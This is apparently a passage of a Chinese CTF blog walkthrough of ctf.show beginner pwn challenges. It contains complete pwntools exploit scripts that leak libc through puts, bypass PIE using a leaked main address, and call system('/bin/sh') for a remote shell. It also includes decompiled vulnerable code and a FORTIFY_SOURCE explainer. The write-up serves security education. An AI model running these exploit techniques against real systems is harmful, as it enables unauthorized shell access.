context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>

<span class="token comment"># 建立连接</span>
p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token string">"28129"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

<span class="token comment"># 溢出偏移地址</span>
offset <span class="token operator">=</span> <span class="token number">0x88</span> <span class="token operator">+</span> <span class="token number">0x4</span>
<span class="token comment"># main函数地址</span>
main_addr <span class="token operator">=</span> elf<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
<span class="token comment"># plt表中puts函数地址</span>
puts_plt <span class="token operator">=</span> elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
<span class="token comment"># got表中puts函数的地址</span>
puts_got <span class="token operator">=</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>

<span class="token comment"># payload：0x88+0x4个无用填充字符覆盖到返回地址，</span>
<span class="token comment"># 将puts函数plt表地址做返回地址，代表ctfshow函数执行完会执行puts函数，</span>
<span class="token comment"># main_addr是puts函数执行完后的返回地址，使用puts函数执行完后回到main函数继续利用溢出漏洞</span>
<span class="token comment"># puts函数got表中的地址作为puts函数执行的参数，让puts函数输出puts函数在内存的地址</span>
payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
<span class="token comment"># 发送payload</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
<span class="token comment"># 接收puts函数输出的puts函数在内存的地址</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token comment"># 在根据内存中puts函数的地址寻找相应的libc版本中puts函数的地址</span>
libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
<span class="token comment"># 找到libc中的puts函数地址之后，将内存的puts函数地址减去libc中的puts函数地址就得到了libc的基地址</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 使用libc.dump("system")找到libc中的system函数地址，再加上基地址就得到system函数在内存的地址</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
<span class="token comment"># 使用libc.dump("str_bin_sh")找到libc中的"/bin/sh"字符串地址，再加上基地址就得到"/bin/sh"字符串在内存的地址</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
<span class="token comment"># payload：填充栈空间到返回地址，将返回地址覆盖为system函数的地址</span>
<span class="token comment"># 然后填充执行system函数之后的返回地址，填充什么都可以，但是长度必须为4</span>
<span class="token comment"># 最后填入system的参数“/bin/sh”</span>
payload <span class="token operator">=</span> offset <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627214303580.png" alt="image-20230627214303580"></p>
<hr>
<h3 id="pwn31"><a href="#pwn31" class="headerlink" title="pwn31"></a>pwn31</h3><blockquote>
<p>绕过PIE</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627225956584.png" alt="image-20230627225956584"></p>
<p>32位，保护除了canary全开</p>
<p>丢进ida</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdin</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setvbuf</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> main<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>argc<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_854<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_8C8<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_944<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_9D0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_A60<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_AE4<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>asc_B78<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>aClassifyCtfsho<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Type  : Linux_Security_Mechanisms                               "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Site  : https://ctf.show/                                       "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * Hint  : Bypass ALSR &amp; PIE "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"    * *************************************                           "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">write</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token string">"Hello CTFshow!\n"</span><span class="token punctuation">,</span> <span class="token number">0xEu</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ctfshow()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token class-name">ssize_t</span> <span class="token function">ctfshow</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">132</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+0h] [ebp-88h] BYREF</span>

  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>看.plt表</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230627230229362.png" alt="image-20230627230229362"></p>
<p>代码跟上道题目的代码都一样，函数也一样，就是开启了PIE和RELRO保护</p>
<p>开了PIE，就代表了地址随机化，我们不能直接知道<strong>偏移量</strong>，不能直接ret2libc梭哈了，那就得寻找别的方法</p>
<p>注意程序中<code> printf(&quot;%p\n&quot;, main);</code>会输出main函数的地址，这样就泄露了main函数的地址</p>
<p>我们就可以拿着它减去main函数的地址获得函数地址的偏移量，</p>
<p>然后拿着程序里的其他函数的地址加上这个偏移量就能拿到程序里函数在内存中的地址，</p>
<p>再利用程序的puts函数输出got表中puts函数的地址，</p>
<p>接着利用LibcSearcher模块根据puts函数的地址就能到puts函数在libc中的偏移，</p>
<p>进而得到libc中system函数的地址以及字符串”&#x2F;bin&#x2F;sh”的地址了，</p>
<p>这样我们再重新构造payload，就能得到目标服务器的权限了</p>
<h4 id="计算溢出偏移量"><a href="#计算溢出偏移量" class="headerlink" title="计算溢出偏移量"></a>计算溢出偏移量</h4><p>首先使用gdb打开pwn，然后使用命令<code>cyclic 200</code>输出200个字符(pwndbg的命令)</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628003631323.png" alt="image-20230628003631323"></p>
<p>接着输入r命令运行程序，这时程序会让我们输入数据，我们就把我们之前的到的200个无用字符复制进去然后运行</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628004051204.png" alt="image-20230628004051204"></p>
<p>这时程序由于栈溢出就会爆出错误，程序会给出一个无效地址(即图中的Invalid address)，就是因为这个地址是无效的，所以我们的程序才会报错，</p>
<p>其实这个无效地址就是被我们覆盖的ctfshow函数的返回地址</p>
<p>然后我们使用命令<code>cyclic -l 0x6261616b</code>，就可以知道这个地址的偏移量，也就是栈溢出的偏移量</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628004354641.png" alt="image-20230628004354641"></p>
<p>可以看到偏移量为140</p>
<h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>

context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">"debug"</span>

p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span> <span class="token number">28173</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./pwn"</span><span class="token punctuation">)</span>

main_real_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>main_real_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
base_addr <span class="token operator">=</span> main_real_addr <span class="token operator">-</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'main'</span><span class="token punctuation">]</span>
<span class="token comment"># 获得了内存中真实的main地址，再减去程序中的main函数的地址就能得到程序中函数在内存中的偏移</span>

puts_plt <span class="token operator">=</span> base_addr <span class="token operator">+</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
puts_got <span class="token operator">=</span> base_addr <span class="token operator">+</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
ctfshow_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'ctfshow'</span><span class="token punctuation">]</span>
ebx <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x1fc0</span>
payload <span class="token operator">=</span> <span class="token number">132</span> <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ebx<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span> <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>main_real_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
puts_addr <span class="token operator">=</span> u32<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>puts_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment"># 通过got表中puts函数的地址打印出puts函数真实的地址</span>

libc <span class="token operator">=</span> LibcSearcher<span class="token punctuation">(</span><span class="token string">"puts"</span><span class="token punctuation">,</span> puts_addr<span class="token punctuation">)</span>
libc_base <span class="token operator">=</span> puts_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>
system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"system"</span><span class="token punctuation">)</span>
binsh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>dump<span class="token punctuation">(</span><span class="token string">"str_bin_sh"</span><span class="token punctuation">)</span>
<span class="token comment"># 找到libc，通过libc找到system、/bin/sh</span>

payload <span class="token operator">=</span> <span class="token number">140</span> <span class="token operator">*</span> <span class="token string">b'a'</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>ctfshow_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>稍微解释一下</p>
<p><code>132 * b‘a’ </code>：这里不是140的原因是在ctfshow函数的最后有一个<code>mov ebx，DWORD PTR[ebp-0x4]</code></p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628011530528.png" alt="image-20230628011530528"></p>
<p>我们必须将这个ebx恢复而不能进行覆盖，</p>
<p>而那140的长度是包含ebp，所以我们132 + ebx的长度为132+4，距离140还差4个长度，我们需要再补充4个没用的字符’a’ </p>
<p>而ebx是通过<code>__x86.get_pc_thunk.bx</code>这个东西得来的，</p>
<p>这个东西的作用是将下一条指令的地址赋给ebx寄存器，然后通过加上一个偏移，得到当前进程GOT表的地址，并以此作为后续操作的基地址。</p>
<p>这个pwn程序的GOT表地址为<code>0x1fc0</code>，则<code>ebx = base_addr + 0x1fc0</code></p>
<p><code>readelf -S pwn</code>查看got表的地址</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628011733737.png" alt="image-20230628011733737"></p>
<p>payload之后就是加上puts函数的地址+ctfshow函数的地址</p>
<p>（这个地址是作为puts函数的返回地址的，等到puts函数执行完，会再次进入ctfshow函数，我们又可以继续利用溢出漏洞了），</p>
<p>之后再加上puts函数的参数，即got表puts函数的地址<code>0xf7dab360</code></p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628011856603.png" alt="image-20230628011856603"></p>
<p>然后就是getshell</p>
<hr>
<h2 id="FORTIFY-SOURCE"><a href="#FORTIFY-SOURCE" class="headerlink" title="FORTIFY_SOURCE"></a>FORTIFY_SOURCE</h2><p>FORTIFY_SOURCE(源码增强)，这个其实有点类似与Windows中用新版Visual Studio进行开发的时候，当你用一些危险函数比如<code>strcpy</code>、<code>sprintf</code>、<code>strcat</code>，编译器会提示你用<code>xx_s</code>加强版函数</p>
<p>具体来说，FORTIFY_SOURCE可以对一些常见的函数，如strcpy、memcpy、memset等进行重载，使它们在运行时能够检测到缓冲区溢出等错误，并且会在出现错误时终止程序的执行，从而避免潜在的安全问题。</p>
<p>此外，FORTIFY_SOURCE还会对格式化字符串函数（如printf、scanf等）的参数进行检查，以确保其格式化字符串参数与实际参数的类型匹配，从而避免格式化字符串漏洞</p>
<p>本质上一种检查和替换机制，对GCC和glibc的一个安全补丁，目前支持memcpy, memmove, memset, strcpy, strncpy, strcat, strncat,sprintf, vsprintf, snprintf, vsnprintf, gets等</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">默认Ubuntu16.04下是关闭的，测试发现Ubuntu18.04是开启的
gcc <span class="token parameter variable">-D_FORTIFY_SOURCE</span><span class="token operator">=</span><span class="token number">1</span>  仅仅只在编译时进行检查（尤其是<span class="token comment">#include &lt;string.h>这种文件头）</span>
gcc <span class="token parameter variable">-D_FORTIFY_SOURCE</span><span class="token operator">=</span><span class="token number">2</span>  程序执行时也会进行检查（如果检查到缓冲区溢出，就会终止程序）

FORTIFY_SOURCE<span class="token punctuation">(</span>代码增强<span class="token punctuation">)</span>
<span class="token parameter variable">-D</span> <span class="token number">1</span><span class="token punctuation">(</span>开启缓冲区溢出攻击检查<span class="token punctuation">)</span>
<span class="token parameter variable">-D</span> <span class="token number">2</span><span class="token punctuation">(</span>开启缓冲区溢出以及格式化字符串攻击检查<span class="token punctuation">)</span> ,通过数组大小来判断替换strcpy、memcpy、memset等函数名，来防止缓冲区溢出。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<hr>
<h3 id="pwn32"><a href="#pwn32" class="headerlink" title="pwn32"></a>pwn32</h3><blockquote>
<p>FORTIFY_SOURCE&#x3D;0</p>
</blockquote>
<p>下载题目附件pwn，丢进虚拟机checksec</p>
<p><img src="/blog/2023/06/20/ctfshow-pwn%E5%85%A5%E9%97%A8/image-20230628101743502.png" alt="image-20230628101743502"></p>
<p>64位，保护除canary全开</p>
<p>丢ida64看看</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> __cdecl <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>envp<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  __gid_t v3<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v4<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">int</span> num<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-44h] BYREF</span>
  <span class="token keyword">char</span> buf2<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+Ah] [rbp-3Eh] BYREF</span>
  <span class="token keyword">char</span> buf1<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+15h] [rbp-33h] BYREF</span>

  v3 <span class="token operator">=</span> <span class="token function">getegid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">setresgid</span><span class="token punctuation">(</span>v3<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v4 <span class="token operator">=</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>buf1 <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>v4<span class="token punctuation">;</span>
  <span class="token operator">*</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf1<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span>_WORD <span class="token operator">*</span><span class="token punctuation">)</span>v4 <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  buf1<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> v4<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> <span class="token string">"CTFshowPWN"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s\n"</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  v5 <span class="token operator">=</span> <span class="token function">strtol</span><span class="token punctuation">(</span>argv<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">0LL</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">memcpy</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">,</span> v5<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">strcpy</span><span class="token punctuation">(</span>buf2<span class="token punctuation">,</span> argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%s %s\n"</span><span class="token punctuation">,</span> buf1<span class="token punctuation">,</span> buf2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> <span class="token number">11</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>buf1<span class="token punctuation">,</span> <span class="token operator">&amp;</span>num<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> argc <span class="token operator">></span> <span class="token number">4</span> <span class="token punctuation">)</span>
    <span class="token function">Undefined</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>Undefined()函数</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> __cdecl <span class="token function">Undefined</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  FILE <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>
  <span class="token keyword">char</span> flag<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-48h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span>
    <span class="token string">"The source code of these three programs is the same, and the results of turning on different levels of protection are understood\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"You should understand the role of these protections!But don't just get a flag\nHere is your flag:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v0 <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag"</span><span class="token punctuation">,</span> <span class="token string">"r"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>v0 <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"/ctfshow_flag: No such file or directory."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>flag<span class="token punctuation">,</span> <span class="token number">64</span><span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>审计代码</p>
<p>程序接收三个参数argc、argv和envp，</p>
<p>其中argc表示<strong>命令行参数的数量</strong>，argv是一个字符指针数组，每个元素指向一个命令行参数的字符串，envp则是一个指向环境变量的指针数组。</p>
<p>函数中首先调用了getegid和setresgid函数，用于获取和设置有效的组ID。然后调用logo函数输出logo信息。</p>
<p>接着通过<code>strtol</code>函数将<code>argv[1]</code>中的前10个字节以及第11个字节拷贝到了buf1数组中，</p>
<p>然后通过<code>strcpy</code>函数将字符串”CTFshowPWN”拷贝到了buf2数组中，并通过printf函数输出了buf1和buf2的值。（注：其实还有argv[0]的，这个参数是每个程序的都一定会有的，并且值为程序名称）	</p>
<p>然后从<code>argv[3]</code>中解析出一个整数值，并将<code>argv[2]</code>中的前v5个字节拷贝到buf1数组中，通过<code>strcpy</code>函数将<code>argv[1]</code>拷贝到buf2数组中，并通过printf函数输出了buf1和buf2的值。</p>
<p>接着使用fgets函数从_bss_start地址开始读取最多11个字节的数据到buf1数组中，</p>
